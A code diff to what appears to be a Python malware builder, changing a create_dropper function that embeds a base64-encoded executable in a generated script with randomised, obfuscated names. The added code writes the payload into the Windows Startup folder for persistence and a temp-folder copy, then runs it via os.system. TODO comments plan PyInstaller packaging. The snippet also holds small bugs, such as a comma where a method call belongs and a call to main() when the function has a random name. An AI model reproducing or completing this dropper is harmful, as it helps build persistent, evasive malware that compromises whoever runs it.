@@ -47,23 +47,33 @@ def create_dropper():
     we are gonna create a dropper with embedded base64 of our main exe.
     this dropper is kind'a in stupid way
     """
-    cuurent_file = get_current_file_path()
+    current_file = get_current_file_path()
     obfuscated_base64_name = random_string(random.randrange(8,17))
     obfuscated_main_function = random_string(random.randrange(9,15))
     obfuscated_file_var = random_string(random.randrange(7,17))
     obfuscated_file_name = random_string(random.randrange(6,17))
-    obfuscated_startup_folder = f"c:/users/{os.getlogin()}/appdata/roaming/microsoft/windows/start menu/programs/startup/{obfuscated_file_name}"
-    dropper_code = f"""
-    import base64 as {obfuscated_base64_name}
-    file_str = {obfuscated_startup_folder}
+    obfuscated_startup_folder = f"'c:/users/{os.getlogin()}/" \
+                                f"appdata/roaming/microsoft/" \
+                                f"windows/start menu/programs/startup/{obfuscated_file_name + '.exe'}'"
+    backup_of_file = f"'c:/users/{os.getlogin()}/appdata/local/temp/{obfuscated_file_name + '.exe'}'"
+    our_base64_file = f'"""{base64_encode_file(current_file)}"""'
+    code = f"""
+    from base64 import b64decode as {obfuscated_base64_name}
+    from os import system
+    our_code = {our_base64_file}
     def {obfuscated_main_function}():
-        with open({cuurent_file},'rb') as {obfuscated_file_var}:
-            info = {obfuscated_base64_name}.b64decode({obfuscated_file_var}.read())
+        with open({obfuscated_startup_folder},'wb') as {obfuscated_file_var}:
+            {obfuscated_file_var}.write({obfuscated_base64_name}(our_code))
+        with open({backup_of_file},'wb') as {obfuscated_file_var}:
+            {obfuscated_file_var},write({obfuscated_base64_name}(our_code))
+        system({backup_of_file})
+    main()
     """
-    #//TODO: ALOT OF THINGS ABOUT THIS, RE THINK IT ASAP
-def get_pyinstaller(pythonPath:str,admin=True):
+    # //TODO: create the py file of the dropper, install it with py installer, and persist it.
+
+def get_pyinstaller(pythonPath: str, admin=True):
     """
-    :param str pythonPath: abs path to python.exe
+    :param str pythonPath: abs path to python.exe}
     :param bool admin: specify if we got admin permissions.
     //TODO 5: create 3 functions from this one. one for each condition.
     """
